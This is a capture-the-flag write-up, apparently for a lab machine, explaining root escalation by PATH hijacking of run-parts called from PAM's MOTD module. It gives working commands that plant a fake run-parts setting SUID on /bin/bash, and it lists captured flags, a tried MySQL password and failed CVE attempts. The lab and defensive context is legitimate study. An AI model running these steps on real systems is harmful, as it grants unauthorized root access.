# Writeup - Privilege Escalation

## Status: ✅ ROOTED

## Flags
- **User**: `539606a7825e5fd092f0e5afa6bd36f2`
- **Root**: `54e1ac1559a7a0e102dfa164fc029ab2`

---

## Successful Exploitation: PATH Hijacking via PAM MOTD

### The Vulnerability

**Root Cause:** `/etc/pam.d/sshd` contains:
```
session optional pam_motd.so motd=/run/motd.dynamic
```

When a user logs in via SSH, `pam_motd.so` executes as root to update the Message of the Day. Internally, it calls:
```
run-parts --lsbsysinit /etc/update-motd.d
```

**The Problem:** `run-parts` is called **without a full path**, causing a PATH lookup.

### Why It Worked

| Element | Detail |
|---------|--------|
| **User** | `jkr` in `staff` group |
| **Writable Path** | `/usr/local/bin` (staff group write access) |
| **PATH Order** | `/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin` |
| **Trigger** | Every SSH login |
| **Execution Context** | Root (UID=0) via PAM |

### Exploitation Steps

```bash
# 1. Create malicious run-parts binary
cat > /usr/local/bin/run-parts << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /usr/local/bin/run-parts

# 2. Trigger the exploit (SSH in)
ssh jkr@10.129.191.3

# 3. Verify SUID bit set
ls -la /bin/bash
# -rwsr-xr-x 1 root root ...

# 4. Get root shell
/bin/bash -p
whoami
# root
```

### Detection

**pspy output revealed:**
```
sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
```

This showed:
- Custom PATH with `/usr/local/bin` first
- `run-parts` called without full path
- Executed as root on SSH login

### Prevention

1. **Always use full paths** in privileged code
2. **Sanitize PATH** in security-sensitive contexts
3. **Avoid writable directories** in root's PATH
4. **Audit PAM configurations** for similar patterns

---

## Failed Attempts (For Reference)

### PwnKit (CVE-2021-4034)
- **pkexec version**: 0.105
- **Result**: Exploit did not work — system patched

### MySQL Credentials Attack
- **Service**: MySQL (127.0.0.1:3306)
- **Credentials tried**: jkr/raykayjay9
- **Result**: Access denied

### Kernel Exploits
- **Looney Tunables (CVE-2023-4911)**: GLIBC 2.36, exploit did not trigger
- **OverlayFS (CVE-2023-0386)**: Not available — overlay module not loaded

---

## Lessons Learned

1. **PATH hijacking** is still viable on modern systems when privileged processes use unqualified commands
2. **PAM modules** execute as root and are often overlooked attack surfaces
3. **Group memberships matter** — `staff` granted write access to paths in root's PATH
4. **Process monitoring** (pspy) reveals execution patterns invisible to static analysis
5. **Failed exploits** are valuable documentation — they narrow the search space
